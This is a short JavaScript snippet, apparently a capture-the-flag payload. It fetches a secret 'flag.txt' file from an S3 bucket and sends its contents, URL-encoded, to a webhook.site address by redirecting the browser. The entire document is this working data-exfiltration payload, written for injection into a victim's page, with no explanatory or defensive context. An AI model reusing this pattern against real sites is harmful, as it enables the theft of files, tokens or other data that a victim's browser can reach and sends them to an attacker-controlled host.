async function sendFlagToWebhook(webhookUrl) {
  try {
    const response = await fetch('https://bugbase-secret-file-storage.s3.ap-northeast-2.amazonaws.com/flag.txt');
    const data = await response.text();
    console.log(data);

    const encodedData = encodeURIComponent(data);
    const urlWithQueryParams = `${webhookUrl}?data=${encodedData}`;

    document.location = urlWithQueryParams;
  } catch (error) {
    console.error('Error:', error);
  }
}

sendFlagToWebhook('https://webhook.site/c9b6fcf2-a309-457b-b6f2-08d9b8d42e39');
